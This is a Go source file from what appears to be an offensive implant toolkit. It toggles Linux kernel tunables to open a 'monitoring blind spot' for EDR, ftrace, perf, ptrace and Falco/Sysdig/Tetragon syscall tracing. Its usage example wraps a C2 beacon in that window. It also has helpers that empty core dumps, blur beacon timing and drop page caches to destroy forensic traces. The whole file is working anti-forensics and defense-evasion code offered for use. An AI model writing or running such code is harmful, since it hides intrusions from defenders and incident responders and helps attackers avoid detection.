package stealth

// Kernel Tunable Toggling — Temporarily Blind Monitoring
//
// OPSEC rationale: Linux exposes many monitoring knobs through /proc/sys/
// and /sys/kernel/. By temporarily disabling them before sensitive operations
// and restoring them after, we create a monitoring blind spot that's
// invisible to tools that sample periodically (most do).
//
// Targets:
//   ftrace       — kills trace-cmd, perf ftrace, eBPF tracepoint-based EDR
//   perf events  — blocks perf record/stat/trace
//   kprobes      — disables dynamic kernel instrumentation
//   ptrace scope — prevents debugger attachment by IR
//   syscall tracepoints — blinds Falco/Sysdig/Tetragon syscall monitoring
//
// Pattern: read original → write disabled → do work → restore original
// Tools that sample at intervals (1s, 5s, 30s) miss the window entirely.
//
// Capability required: CAP_SYS_ADMIN (or root) for most tunables
//
// Detection surface:
//   - inotify watch on the tunable files would catch the write
//   - Continuous polling (sub-second) of tunable values
//   - Audit rules on write() to /proc/sys/ paths (rare)

import (
	"fmt"
	"os"
	"strings"
	"sync"
)

// KTunable represents a single kernel tunable that can be toggled.
type KTunable struct {
	mu        sync.Mutex
	Path      string // sysfs/procfs path
	Disabled  string // value that disables/weakens the feature
	Permanent bool   // if true, value is irreversible until reboot
	original  string // saved original value
	saved     bool
}

// Well-known tunables that blind monitoring infrastructure.
var (
	// TuneFtrace disables the function tracer.
	// Kills: trace-cmd, perf ftrace, ftrace-based eBPF programs.
	TuneFtrace = &KTunable{
		Path:     "/proc/sys/kernel/ftrace_enabled",
		Disabled: "0",
	}

	// TunePerfParanoid sets maximum restriction on perf events.
	// Kills: perf record, perf stat, perf trace (for non-root).
	// Value 3 = no perf for anyone except CAP_PERFMON.
	TunePerfParanoid = &KTunable{
		Path:     "/proc/sys/kernel/perf_event_paranoid",
		Disabled: "3",
	}

	// TunePtraceScope restricts ptrace to no process at all.
	// Kills: strace, ltrace, gdb attach, IR debugger attachment.
	// Value 3 = no ptrace allowed (even root needs CAP_SYS_PTRACE).
	TunePtraceScope = &KTunable{
		Path:     "/proc/sys/kernel/yama/ptrace_scope",
		Disabled: "3",
	}

	// TuneBPFDisable prevents unprivileged eBPF program loading.
	// Kills: non-root eBPF monitoring tools.
	// Value "2" is permanent until reboot; Restore() will skip this tunable.
	TuneBPFDisable = &KTunable{
		Path:      "/proc/sys/kernel/unprivileged_bpf_disabled",
		Disabled:  "2", // 2 = permanently disabled until reboot
		Permanent: true,
	}

	// TuneKptrRestrict hides kernel pointers from all users.
	// Kills: /proc/kallsyms symbol resolution, kernel exploit tools.
	TuneKptrRestrict = &KTunable{
		Path:     "/proc/sys/kernel/kptr_restrict",
		Disabled: "2",
	}

	// TuneTracingOn disables the global ftrace tracing switch.
	// Kills: ALL active ftrace-based tracing system-wide.
	TuneTracingOn = &KTunable{
		Path:     "/sys/kernel/tracing/tracing_on",
		Disabled: "0",
	}

	// TuneSyscallTrace disables syscall tracepoints.
	// Kills: Falco, Sysdig, Tetragon syscall event sources.
	TuneSyscallTrace = &KTunable{
		Path:     "/sys/kernel/tracing/events/syscalls/enable",
		Disabled: "0",
	}
)

// Save reads and stores the current value of the tunable.
func (t *KTunable) Save() error {
	t.mu.Lock()
	defer t.mu.Unlock()

	data, err := os.ReadFile(t.Path)
	if err != nil {
		return fmt.Errorf("read %s: %v", t.Path, err)
	}
	t.original = strings.TrimSpace(string(data))
	t.saved = true
	return nil
}

// Disable writes the disabled value to the tunable.
// Must call Save() first to preserve the original value.
func (t *KTunable) Disable() error {
	t.mu.Lock()
	defer t.mu.Unlock()

	if !t.saved {
		// Inline save logic to avoid recursive lock.
		data, err := os.ReadFile(t.Path)
		if err != nil {
			return fmt.Errorf("read %s: %v", t.Path, err)
		}
		t.original = strings.TrimSpace(string(data))
		t.saved = true
	}
	if err := os.WriteFile(t.Path, []byte(t.Disabled), 0644); err != nil {
		return fmt.Errorf("write %s: %v", t.Path, err)
	}
	return nil
}

// Restore writes the original saved value back.
// Permanent tunables (e.g., unprivileged_bpf_disabled=2) cannot be restored
// until reboot and are skipped.
func (t *KTunable) Restore() error {
	t.mu.Lock()
	defer t.mu.Unlock()

	if t.Permanent {
		return fmt.Errorf("restore %s: permanent tunable, requires reboot", t.Path)
	}
	if !t.saved {
		return fmt.Errorf("no saved value for %s", t.Path)
	}
	if err := os.WriteFile(t.Path, []byte(t.original), 0644); err != nil {
		return fmt.Errorf("restore %s: %v", t.Path, err)
	}
	return nil
}

// Available checks if the tunable file exists and is writable.
func (t *KTunable) Available() bool {
	f, err := os.OpenFile(t.Path, os.O_WRONLY, 0)
	if err != nil {
		return false
	}
	f.Close()
	return true
}

// MonitorBlind groups multiple tunables for batch disable/restore operations.
// This creates a coordinated monitoring blackout window.
type MonitorBlind struct {
	tunables []*KTunable
	active   bool
	mu       sync.Mutex
}

// NewMonitorBlind creates a blind window from the given tunables.
// Only tunables that exist and are writable are included.
func NewMonitorBlind(tunables ...*KTunable) *MonitorBlind {
	var available []*KTunable
	for _, t := range tunables {
		if t.Available() {
			available = append(available, t)
		}
	}
	return &MonitorBlind{tunables: available}
}

// DefaultMonitorBlind creates a blind window with all known tunables.
func DefaultMonitorBlind() *MonitorBlind {
	return NewMonitorBlind(
		TuneFtrace,
		TunePerfParanoid,
		TunePtraceScope,
		TuneTracingOn,
		TuneSyscallTrace,
	)
}

// AggressiveMonitorBlind includes tunables that may have side effects.
// BPFDisable with value "2" is permanent until reboot — use with caution.
func AggressiveMonitorBlind() *MonitorBlind {
	return NewMonitorBlind(
		TuneFtrace,
		TunePerfParanoid,
		TunePtraceScope,
		TuneBPFDisable,
		TuneKptrRestrict,
		TuneTracingOn,
		TuneSyscallTrace,
	)
}

// Engage disables all tunables in the group, creating a monitoring blind spot.
// Returns the number of tunables successfully disabled.
func (mb *MonitorBlind) Engage() int {
	mb.mu.Lock()
	defer mb.mu.Unlock()

	count := 0
	for _, t := range mb.tunables {
		if err := t.Disable(); err == nil {
			count++
		}
	}
	mb.active = true
	return count
}

// Disengage restores all tunables to their original values.
// Returns the number of tunables successfully restored.
func (mb *MonitorBlind) Disengage() int {
	mb.mu.Lock()
	defer mb.mu.Unlock()

	count := 0
	for _, t := range mb.tunables {
		if err := t.Restore(); err == nil {
			count++
		}
	}
	mb.active = false
	return count
}

// WithBlind executes fn with monitoring disabled, then restores.
// This is the primary API — keeps the blind window as short as possible.
//
// Usage:
//
//	blind := DefaultMonitorBlind()
//	blind.WithBlind(func() {
//	    // Sensitive operations here — monitoring is disabled
//	    performC2Beacon()
//	})
//	// Monitoring is restored
func (mb *MonitorBlind) WithBlind(fn func()) {
	mb.Engage()
	defer mb.Disengage()
	fn()
}

// Active returns whether the blind is currently engaged.
func (mb *MonitorBlind) Active() bool {
	mb.mu.Lock()
	defer mb.mu.Unlock()
	return mb.active
}

// Count returns how many tunables are available in this blind.
func (mb *MonitorBlind) Count() int {
	return len(mb.tunables)
}

// SetSelfCoredumpFilter configures our process coredump filter to exclude
// everything — even forced core dumps produce empty files.
// This is separate from RLIMIT_CORE (which we already set to 0) because
// some forensic tools bypass the rlimit by writing to /proc/pid/coredump_filter.
func SetSelfCoredumpFilter() error {
	// 0x00 = exclude all memory types from core dumps
	return os.WriteFile("/proc/self/coredump_filter", []byte("0x00"), 0644)
}

// SetTimerSlack increases our timer slack to make timing-based detection
// unreliable. The kernel coalesces our timers with nearby timers, making
// our beacon timing jitter harder to fingerprint.
func SetTimerSlack(nanoseconds uint64) error {
	data := fmt.Sprintf("%d", nanoseconds)
	return os.WriteFile("/proc/self/timerslack_ns", []byte(data), 0644)
}

// DropCaches forces the kernel to drop page cache, dentries, and inodes.
// This destroys cached file contents that forensic tools might read from
// memory without disk access (e.g., recently accessed config files).
func DropCaches() error {
	return os.WriteFile("/proc/sys/vm/drop_caches", []byte("3"), 0644)
}
